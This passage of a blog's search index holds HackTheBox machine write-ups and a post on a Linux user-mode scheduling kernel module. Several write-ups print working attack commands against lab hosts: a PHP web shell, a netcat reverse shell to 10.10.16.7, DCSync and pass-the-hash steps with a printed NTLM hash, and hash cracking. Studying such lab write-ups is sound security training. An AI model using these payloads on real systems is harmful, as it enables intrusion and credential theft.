states that it uses .htpasswd for authentification After downloading tar file, we see that it contains david\u0026rsquo;s key Which is protected, so let\u0026rsquo;s crack it with john Let\u0026rsquo;s connect using the key Root Let\u0026rsquo;s enumerate for privesc again We see bin folder with script inside We see that journalctl is executed as sudo Thus david is a sudoer Let\u0026rsquo;s check GTFOBins So the trick here was that we need to shrink the terminal, so that journalctl will pipe stdout to less Based on script we have 5 lines We shrink terminal to less than 5 Output from the journalctl will be sent to less as root And we can type !/bin/bash to get us a root shell ","date":"June 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/traverxec/images/traverxec.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/traverxec/","summary":"Traverxec Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.165 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 19:35 BST Nmap scan report for 10.10.10.165 (10.10.10.165) Host is up (0.096s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa99a81668cd41ccf96c8401c759095c (RSA) | 256 93dd1a23eed71f086b58470973a388cc (ECDSA) |_ 256 9dd6621e7afb8f5692e637f110db9bce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.","tags":["HTB"],"title":"[HTB] Machine: Traverxec"},{"categories":null,"contents":"User-mode Scheduling (UMS) 1. Introduction User-mode scheduling (UMS) is a lightweight mechanism that applications can use to schedule their own threads [1]. It allows the programmer of a C user space application to schedule threads without involving the kernel scheduler. The overview of the mechanism is described by Dave Probert in [4] or can be found by searching for his interview on Microsoft Learn [5], since his interview from Channel 9 was moved there [6]. The project was implemented based on specifications described in [2]. 2. Design The design was inspired by Dave Probert\u0026rsquo;s interview [4] and the patent for UMS on Windows [7]: In general: UMS module is responsible for management of UMS mechanism. It receives requests from processes, stores respective data structures (process, scheduler, worker thread descriptors and completion lists) and performs requested actions. The process which intents to use UMS has to register itself in UMS module, create required completion lists, create and assign worker threads to completion lists and then create schedulers associated with completion lists. Schedulers are in charge of determining which worker thread has to be scheduled. Multiple schedulers can share completion lists. Scheduler hosts the execution of the worker threads. 3. Implementation The project consists of UMS kernel module and UMS library. The general execution flow is depicted as follow: The execution flow was inspired by an example provided in [3]. Execution flow in steps: Process calls ums_enter() to request UMS module to manage the current process. Process calls ums_create_completion_list() to request creation of the completion list. This step is continued until all required completion lists are created. Process calls ums_create_worker_thread() to request creation of the worker thread. This step is continued until all required worker threads are created. Process calls ums_create_scheduler() to request creation of the pthread [8] that will become the scheduler. This step is continued until all required scheduler are created. After pthread is created, it calls ums_enter_scheduling_mode() to convert itself to a scheduler. Subsequently, scheduler jumps to an entrypoint, a function that is executed to determine the next worker thread for scheduling (it is called when a the scheduler is started the first time, and when a worker thread yeilds). In this step, scheduler usually calls ums_dequeue_completion_list_items() to obtain a list available threads to run. After finding the worker thread for scheduling, scheduler calls ums_execute_worker(), which consists of 2 parts to perform a full context switch: Saving the current context of the scheduler Loading the context switch of the worker thread All these steps are continued until all the work is completed. Then the scheduler calls ums_exit_scheduling_mode() to convert itself back to pthread and finishes the work via pthread_exit() The main thread of the process waits for all pthreads (schedulers) to complete their work and then calls ums_exit() to notify the UMS module about the completion. 3.1. Module The module consists of: ums_dev.h and ums_dev.c - responsible for UMS miscdevice and its\u0026rsquo; implementation, also includes other headers required by UMS device to function properly. ums_api.h and ums_api.c - contain essential functions, data structures and proc filesystem of the UMS kernel module and their implementations. const.h - is a set of data structures and other constant variables used by UMS kernel module to handle requests from processes. 3.2. Library The library consists of: ums_lib.h and ums_lib.c - contain essential UMS library functions and their implementations. The header has to be included by the user in order to use the UMS library. The header is dependent on const.h and list.h headers described below. const.h - is a set of data structures and other constant variables used by UMS library to make ioctl calls. It is somewhat similar to const.h from the UMS module, but it was made as a separate file to make library independent from the module sources. list.h - is the implementation of the Linux kernel linked list and hash list data structures for user space and was downloaded from [9]. Results The project was run on Ubuntu 20.04.2 LTS by using 2-core virtual machine via VirtualBox. The version of the kernel was Linux 5.8.0-55-generic. Example with 2 schedulers with separate completion lists depicted below: The proc filesystem: The UMS module information log: As a benchmark statistics, the switching time for schedulers was on average within 250-360 nanoseconds. Note that, there were situations with schedulers that share the same completion list, where only one scheduler completed all the work leaving other schedulers without any work. It was due to the fact that the schedulers are viewed as a simple threads by the linux system. Thus it was system scheduler\u0026rsquo;s decision to run only one scheduler thread, which happened to finish all the work before other scheduler threads were woken up. References [1] https://docs.microsoft.com/en-us/windows/win32/procthread/user-mode-scheduling [2] https://gpm.name/teaching/2021-aosv/news/2021/04/09/final-project-track/ [3] https://lastsector.wordpress.com/2013/06/08/curious-case-of-user-mode-scheduling/ [4] https://www.youtube.com/watch?v=PYlP8MXRCZc [5] https://docs.microsoft.com/en-us/learn/ [6] https://docs.microsoft.com/en-us/teamblog/channel9joinedmicrosoftlearn [7] https://patents.google.com/patent/US20100083275A1/en [8] https://man7.org/linux/man-pages/man7/pthreads.7.html [9] https://www.mcs.anl.gov/~kazutomo/list/list.h ","date":"June 26, 2023","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/projects/ums/","summary":"User-mode Scheduling (UMS) 1. Introduction User-mode scheduling (UMS) is a lightweight mechanism that applications can use to schedule their own threads [1]. It allows the programmer of a C user space application to schedule threads without involving the kernel scheduler. The overview of the mechanism is described by Dave Probert in [4] or can be found by searching for his interview on Microsoft Learn [5], since his interview from Channel 9 was moved there [6].","tags":["Projects"],"title":"[Projects] User-mode Scheduling (UMS)"},{"categories":null,"contents":"Forest Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.161 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 16:32 BST Nmap scan report for 10.10.10.161 (10.10.10.161) Host is up (0.15s latency). Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-26 15:39:16Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h26m18s, deviation: 4h02m30s, median: 6m17s | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2023-06-26T15:39:27 |_ start_date: 2023-06-26T14:24:16 | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2023-06-26T08:39:24-07:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.94 seconds Dns No results with zone transfer Nothing on smb Let\u0026rsquo;s use the following post: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/ Foothold/User We got the following users Administrator sebastien lucinda svc-alfresco andy mark santi Let\u0026rsquo;s start with AS-REP Roasting impacket-GetNPUsers htb/ -dc-ip 10.10.10.161 -usersfile user.list -format hashcat -no-pass We got hash Let\u0026rsquo;s crack it: hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt Let\u0026rsquo;s connect evil-winrm -u 'svc-alfresco' -p 's3rvice' -i 10.10.10.161 Root Let\u0026rsquo;s enumerate domain using bloodhound I ran python version of the tool from the attack box: bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -dc forest.htb.local -ns 10.10.10.161 -c all --zip You can upload Sharphound to the box and run it to get the same results Start neo4j sudo neo4j start Launch bloodhound: bloodhound And import zip file svc-alfresco is a member of Service Accounts, which is a member of Privileged IT Accounts, which is a member of Account Operators, Thus svc-alfresco is a member of Account Operators. While Account Operators has Generic All privilege on the Exchange Windows Permissions group. According to the post: The Exchange Windows Permissions group has WriteDacl access on the Domain object in Active Directory, which means any member of the group can modify the domain privileges, such as the ability to perform DCSync, or synchronization operations by Domain Controllers. So we can perform dcsync attack $pass = ConvertTo-SecureString \u0026quot;Password123\u0026quot; -AsPlainText -Force New-ADUser pentest -AccountPassword $pass -Enabled $True Add-ADGroupMember -Identity \u0026quot;Exchange Windows Permissions\u0026quot; -members pentest $cred = New-Object system.management.automation.pscredential('htb\\pentest', $pass) Add-ObjectACL -PrincipalIdentity pentest -Credential $cred -Rights DCSync We need to perform these commands one by one And then perform dcsync impacket-secretsdump htb.local/pentest:Password123@10.10.10.161 -just-dc Connect using Administrator\u0026rsquo;s hash impacket-psexec htb.local/administrator@10.10.10.161 -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' ","date":"June 24, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/forest/images/forest.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/","summary":"Forest Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.161 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 16:32 BST Nmap scan report for 10.10.10.161 (10.10.10.161) Host is up (0.15s latency). Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-26 15:39:16Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.","tags":["HTB"],"title":"[HTB] Machine: Forest"},{"categories":null,"contents":"Postman Enumeration nmap Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 17:52 BST Nmap scan report for postman (10.10.10.160) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46834ff13861c01c74cbb5d14a684d77 (RSA) | 256 2d8d27d2df151a315305fbfff0622689 (ECDSA) |_ 256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: The Cyber Geek\u0026#39;s Personal Website |_http-server-header: Apache/2.4.29 (Ubuntu) 6379/tcp open redis Redis key-value store 4.0.9 10000/tcp open http MiniServ 1.910 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). |_http-server-header: MiniServ/1.910 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.20 seconds Web server Port 10000 Port 6379 redis-tools Foothold We can use this post as a guide So after trying several options I stopped on SSH: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh Generate key if you have not yet: ssh-keygen -b 2048 -t rsa Create a txt file from key: (echo -e \u0026quot;\\n\\n\u0026quot;; cat ~/.ssh/id_rsa.pub; echo -e \u0026quot;\\n\\n\u0026quot;) \u0026gt; key.txt Connect using id_rsa User We have another user Matt Found a key in /opt folder Which is encrypted Let\u0026rsquo;s use john But it doesn\u0026rsquo;t work If we check the config file for ssh, we see that the Matt\u0026rsquo;s connections are denied Luckily Matt reuses the password as ssh key password Root We saw that webmin is running as a root Let\u0026rsquo;s search exploits for webmin Login as Matt to webmin on port 10000 We can see the version Googling for exploits for that specific version will result in CVE-2019-12840 poc Let\u0026rsquo;s download poc and run it Rooted ","date":"June 24, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/postman/images/postman.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/postman/","summary":"Postman Enumeration nmap Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 17:52 BST Nmap scan report for postman (10.10.10.160) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46834ff13861c01c74cbb5d14a684d77 (RSA) | 256 2d8d27d2df151a315305fbfff0622689 (ECDSA) |_ 256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: The Cyber Geek\u0026#39;s Personal Website |_http-server-header: Apache/2.4.29 (Ubuntu) 6379/tcp open redis Redis key-value store 4.","tags":["HTB"],"title":"[HTB] Machine: Postman"},{"categories":null,"contents":"Stocker Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p20,80 -sC -sV 10.10.11.196 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 11:10 EDT Nmap scan report for 10.10.11.196 (10.10.11.196) Host is up (0.11s latency). PORT STATE SERVICE VERSION 20/tcp closed ftp-data 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://stocker.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds I found nothing on default web page so I started ffuf for vhost enumeration â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#39;Host: FUZZ.stocker.htb\u0026#39; -u http://stocker.htb -fs 178 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://stocker.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.stocker.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 178 ________________________________________________ [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 186ms] * FUZZ: dev :: Progress: [19966/19966] :: Job [1/1] :: 274 req/sec :: Duration: [0:01:00] :: Errors: 0 :: dev.stocker.htb The web stack Foothold / User So based on the web stack Express sometimes comes with NoSQL solutions So after trying few SQL injections, I had success with NoSQL ones https://book.hacktricks.xyz/pentesting-web/nosql-injection And we got access We can order items Let\u0026rsquo;s order a few and intercept requests Let\u0026rsquo;s run exiftool on pdf file It was generated by Skia/PDF m108 Let\u0026rsquo;s test a payload based on this post Looks like it worked Let\u0026rsquo;s exploit it Since it\u0026rsquo;s NodeJS, I wanted to check source code And we see hardcoded password Let\u0026rsquo;s ssh to box I used usernames gathered during the enumeration from the web server None worked Then using exploit above we see that there is angoose user and password works Root Enumerating box resulted in scripts folder and sudo rights Since we have * we can execuite any js script on this box So let\u0026rsquo;s create a malicious js For testing purposes as a template I used the current script Changed text.txt to root.txt And got a flag Which proves that we can execute any js as root, so we could either spawn a reverse shell or set suid bit for /bin/bash ","date":"June 24, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/stocker/images/stocker.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/stocker/","summary":"Stocker Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p20,80 -sC -sV 10.10.11.196 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 11:10 EDT Nmap scan report for 10.10.11.196 (10.10.11.196) Host is up (0.11s latency). PORT STATE SERVICE VERSION 20/tcp closed ftp-data 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://stocker.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Stocker"},{"categories":null,"contents":"Haystack Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.115 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 19:36 BST Nmap scan report for 10.10.10.115 (10.10.10.115) Host is up (0.55s latency). Not shown: 922 filtered tcp ports (no-response), 75 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a8de2928b14b63fe42f3a4743238b2b (RSA) | 256 e75a3a978e8e728769a30dd100bc1f09 (ECDSA) |_ 256 01d259b2660a9749205f1c84eb81ed95 (ED25519) 80/tcp open http nginx 1.12.2 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: nginx/1.12.2 9200/tcp open http nginx 1.12.2 |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=UTF-8). | http-methods: |_ Potentially risky methods: DELETE |_http-server-header: nginx/1.12.2 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 89.56 seconds Web server Port 9200 Foothold Let\u0026rsquo;s download the image and check it Run: file needle.jpg xxd needle.jpg strings needle.jpg You will notice a base64 string Nothing else Let\u0026rsquo;s check elasticsearch curl http://10.10.10.115:9200/_cat/indices?v Let\u0026rsquo;s check bank and quotes indeces curl -s -X GET \u0026quot;http://10.10.10.115:9200/bank/_search?size=1000\u0026quot; | jq -c '.hits.hits[]' curl -s -X GET \u0026quot;http://10.10.10.115:9200/quotes/_search?size=1000\u0026quot; | jq -c '.hits.hits[]' We don\u0026rsquo;t find a clue that we had from image in bank index But we find it in quotes Let\u0026rsquo;s decode them SSH to box as security User Enumerate for privesc So let\u0026rsquo;s port forward 5601 ssh -L 5601:localhost:5601 security@10.10.10.115 We have a LFI in the kibana https://github.com/mpgn/CVE-2018-17246 Root We have a logstash running as root Let\u0026rsquo;s open conf files According to input.conf every 10 seconds checks /opt/kibana/logstash_* and inputs files to filter.conf which eventually get executed based on output.conf Let\u0026rsquo;s exploit the exec plugin by crafting the payload that passes the filter Launch listener and wait for connection Rooted ","date":"June 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/haystack/images/haystack.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/haystack/","summary":"Haystack Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.115 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 19:36 BST Nmap scan report for 10.10.10.115 (10.10.10.115) Host is up (0.55s latency). Not shown: 922 filtered tcp ports (no-response), 75 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a8de2928b14b63fe42f3a4743238b2b (RSA) | 256 e75a3a978e8e728769a30dd100bc1f09 (ECDSA) |_ 256 01d259b2660a9749205f1c84eb81ed95 (ED25519) 80/tcp open http nginx 1.","tags":["HTB"],"title":"[HTB] Machine: Haystack"},{"categories":null,"contents":"Heist Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.149 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 10:40 BST Nmap scan report for 10.10.10.149 (10.10.10.149) Host is up (0.10s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -30s | smb2-time: | date: 2023-06-24T09:40:31 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.50 seconds gobuster â””â”€$ gobuster dir -u http://10.10.10.149 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx,php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.149 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: asp,aspx,php [+] Timeout: 10s =============================================================== 2023/06/24 11:12:31 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.149/images/] /index.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /login.php (Status: 200) [Size: 2058] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.149/Images/] /issues.php (Status: 302) [Size: 16] [--\u0026gt; login.php] /css (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.149/css/] /Index.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /Login.php (Status: 200) [Size: 2058] /js (Status: 301) [Size: 146] [--\u0026gt; http://10.10.10.149/js/] /Issues.php (Status: 302) [Size: 16] [--\u0026gt; login.php] /attachments (Status: 301) [Size: 155] [--\u0026gt; http://10.10.10.149/attachments/] /IMAGES (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.149/IMAGES/] /INDEX.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /CSS (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.149/CSS/] /JS (Status: 301) [Size: 146] [--\u0026gt; http://10.10.10.149/JS/] /Attachments (Status: 301) [Size: 155] [--\u0026gt; http://10.10.10.149/Attachments/] /LogIn.php (Status: 200) [Size: 2058] /LOGIN.php (Status: 200) [Size: 2058] Progress: 882180 / 882244 (99.99%) =============================================================== 2023/06/24 11:59:05 Finished =============================================================== Web server If we click Login as guest Foothold Let\u0026rsquo;s open the attachment Now we have 3 possible usernames: hazard, rout3r, admin And 3 passwords, which we need to decrypt Using the online decoder resulted in: $uperP@ssword, Q4)sJu\\Y8qz*A3?d And the john: stealth1agent Let\u0026rsquo;s use crackmapexec to find a correct combination Okay we have creds But they seem to work only for smb Let\u0026rsquo;s see if there are any other users on the box impacket-lookupsid hazard:stealth1agent@10.10.10.149 We now have 3 additional users: Chase, Jason and support Let\u0026rsquo;s run crackmapexec again just in case Use the creds launch evil-winrm Root Let\u0026rsquo;s enumerate for privesc Tried Lazagne, but no results Checked installed programs We see Firefox Let\u0026rsquo;s check if it\u0026rsquo;s running During enumeration process with gobuster that we have login.php Let\u0026rsquo;s check that file located in c:\\inetpub\\wwwroot We see that the password hash is hardcoded We see the params that we can use to grep from memory dump (we could also send a request and check params from the browser or proxy) We can use procdump64 to dump the firefox memory Or mimikittenz Or Out-Minidump from Powersploit Let\u0026rsquo;s grep the parameters from the memory dump We got password for administrator Use evil-winrm Rooted ","date":"June 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/heist/images/heist.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/heist/","summary":"Heist Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.149 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 10:40 BST Nmap scan report for 10.10.10.149 (10.10.10.149) Host is up (0.10s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds?","tags":["HTB"],"title":"[HTB] Machine: Heist"},{"categories":null,"contents":"Networked Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.146 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 17:13 BST Nmap scan report for 10.10.10.146 (10.10.10.146) Host is up (0.51s latency). Not shown: 921 filtered tcp ports (no-response), 76 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2275d7a74f81a7af5266e52744b1015b (RSA) | 256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA) |_ 256 73cda05b84107da71c7c611df554cfc4 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). 443/tcp closed https Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 85.91 seconds gpbuster â””â”€$ gobuster dir -u 10.10.10.146 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.146 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2023/06/23 17:21:53 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 207] /uploads (Status: 301) [Size: 236] [--\u0026gt; http://10.10.10.146/uploads/] /photos.php (Status: 200) [Size: 1302] /upload.php (Status: 200) [Size: 169] /lib.php (Status: 200) [Size: 0] /backup (Status: 301) [Size: 235] [--\u0026gt; http://10.10.10.146/backup/] /.html (Status: 403) [Size: 207] Web server Backup Foothold Source code Let\u0026rsquo;s try a web shell \u0026lt;?php system($_GET['cmd']); ?\u0026gt; Create a file named shell.php.jpg and add jpg signature via hexeditor https://en.wikipedia.org/wiki/List_of_file_signatures Upload to server Spawn reverse shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.7 6666 \u0026gt;/tmp/f Url encode: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20%2Di%202%3E%261%7Cnc%2010%2E10%2E16%2E7%206666%20%3E%2Ftmp%2Ff User Enumeration It\u0026rsquo;s a cron job, so we can try command injection since we control the $value Let\u0026rsquo;s create payload file and launch our listener And we got our user Root sudo -l So let\u0026rsquo;s abuse that according to link below https://seclists.org/fulldisclosure/2019/Apr/24 ","date":"June 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/networked/images/networked.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/networked/","summary":"Networked Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.146 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 17:13 BST Nmap scan report for 10.10.10.146 (10.10.10.146) Host is up (0.51s latency). Not shown: 921 filtered tcp ports (no-response), 76 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2275d7a74f81a7af5266e52744b1015b (RSA) | 256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA) |_ 256 73cda05b84107da71c7c611df554cfc4 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Networked"},{"categories":null,"contents":"Safe Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.147 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 17:07 BST Nmap scan report for 10.10.10.147 (10.10.10.147) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 6d7c813d6a3df95f2e1f6a97e500bade (RSA) | 256 997e1e227672da3cc9617d74d78033d2 (ECDSA) |_ 256 6a6bc38e4b28f76085b162ff54bcd8d6 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.4.25 (Debian) 1337/tcp open waste? | fingerprint-strings: | DNSStatusRequestTCP: | 12:07:15 up 1:02, 0 users, load average: 0.07, 0.03, 0.09 | DNSVersionBindReqTCP: | 12:07:10 up 1:02, 0 users, load average: 0.08, 0.03, 0.09 | GenericLines: | 12:06:57 up 1:02, 0 users, load average: 0.10, 0.04, 0.09 | What do you want me to echo back? | GetRequest: | 12:07:03 up 1:02, 0 users, load average: 0.09, 0.04, 0.09 | What do you want me to echo back? GET / HTTP/1.0 | HTTPOptions: | 